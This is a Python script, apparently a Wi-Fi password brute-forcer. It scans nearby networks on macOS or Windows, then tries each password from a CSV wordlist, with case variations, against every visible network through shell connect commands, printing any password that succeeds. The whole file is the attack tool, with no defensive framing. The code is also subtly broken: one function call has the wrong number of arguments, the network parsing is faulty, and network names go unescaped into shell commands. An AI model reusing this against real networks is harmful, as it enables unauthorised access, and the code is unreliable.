import os
import sys
import csv
import subprocess
import xml.etree.ElementTree as ET
import platform

PASSWORDS = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'password.csv')

def get_network_list():
    net_list_comm = ""
    if platform.system() == "Darwin":  # macOS
        net_list_comm = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s -x'
    elif platform.system() == "Windows":  # Windows
        net_list_comm = 'netsh wlan show networks mode=bssid'
    else:
        raise NotImplementedError("Unsupported OS")

    try:
        net_list_xml = subprocess.check_output(net_list_comm, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute network list command: {e}")
        sys.exit(1)

    net_array = []
    net_names = []

    if platform.system() == "Darwin":
        root = ET.fromstring(net_list_xml)
        for network in root.findall(".//dict/array/dict"):
            ssid = network.findtext('string[7]')
            ssid_name = network.findtext('string[32]')
            if ssid and ssid_name:
                net_array.append(ssid)
                net_names.append(ssid_name)
    elif platform.system() == "Windows":
        net_list = net_list_xml.decode().split('\n')
        for line in net_list:
            if "SSID" in line:
                net_array.append(line.split(":")[-1].strip())
            if "BSSID" in line:
                net_names.append(line.split(":")[-1].strip())

    print(f"Network SSIDs: {net_array}")
    print(f"Network Names: {net_names}")

    return len(net_array), net_array, net_names

def _sanitize_field(node):
    return node.replace("'", "\\'") if node else node

def get_password_array(password):
    password_data = []
    pass_array = [password]

    # Check if the password contains only numeric characters
    if password.isdigit():
        pass_array.append(int(password))  # Convert to integer for numeric keys
    else:
        # Generate other variations only if the password contains alphabetic characters
        pass_array.extend([
            password.upper(),
            password.capitalize(),
            "".join(c.lower() if i % 2 == 0 else c for i, c in enumerate(password)),
            "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(password))
        ])

    password_data.append(len(pass_array))
    password_data.append(pass_array)
    return password_data

def connect_to_network(network_name, password_variations, net_data, net_names_array):
    for i in range(len(net_names_array)):
        if network_name == net_names_array[i]:
            for password in password_variations:
                if platform.system() == "Darwin":
                    net_con = f'networksetup -setairportnetwork Airport {net_names_array[i]} {password}'
                elif platform.system() == "Windows":
                    net_con = f'netsh wlan connect name="{net_data[i]}" ssid="{net_names_array[i]}" key="{password}"'
                else:
                    continue

                print(f"Executing command: {net_con}")

                try:
                    output = subprocess.check_output(net_con, shell=True)
                    print(f"Command output: {output}")
                    print(f'Connected to Network Name: {net_names_array[i]}\nNetwork SSID: {net_data[i]}\nNetwork Password: {password}\n')
                    return
                except subprocess.CalledProcessError as e:
                    print(f"Failed to execute connection command: {e}")
                    continue

    print(f"Network '{network_name}' not found or failed to connect.")

def connect_to_all_networks(network_data, password_variations):
    net_size, net_data, net_names_array = network_data

    for i in range(net_size):
        for password in password_variations:
            if platform.system() == "Darwin":
                net_con = f'networksetup -setairportnetwork Airport {net_names_array[i]} {password}'
            elif platform.system() == "Windows":
                net_con = f'netsh wlan connect name="{net_data[i]}" ssid="{net_names_array[i]}" key="{password}"'
            else:
                continue

            print(f"Executing command: {net_con}")

            try:
                output = subprocess.check_output(net_con, shell=True)
                print(f"Command output: {output}")
                print(f'Connected to Network Name: {net_names_array[i]}\nNetwork SSID: {net_data[i]}\nNetwork Password: {password}\n')
            except subprocess.CalledProcessError as e:
                print(f"Failed to execute connection command: {e}")
                continue

# get network array (size of list, list)
network_size, network_data, network_names = get_network_list()

# Check if the passwords file exists
if not os.path.isfile(PASSWORDS):
    print(f"Password file not found: {PASSWORDS}")
    sys.exit(1)

# User choice to connect to a specific network or all networks
while True:
    choice = input("Do you want to connect to a specific Wi-Fi network (enter 'specific') or all Wi-Fi networks (enter 'all')? ").strip().lower()

    if choice == 'specific':
        network_to_connect = input("Enter the name of the Wi-Fi network to connect to: ").strip()
        connect_to_network(network_to_connect, ['password123'], (network_size, network_data, network_names))  # Replace ['password123'] with your password variations
        break
    elif choice == 'all':
        # Read passwords from the CSV file
        with open(PASSWORDS, 'r', newline='') as f:
            reader = csv.reader(f)
            for i, line in enumerate(reader):
                password_variations = get_password_array(_sanitize_field(line[0]))
                connect_to_all_networks((network_size, network_data, network_names), password_variations[1])
        break
    else:
        print("Invalid choice. Please enter 'specific' or 'all'.")
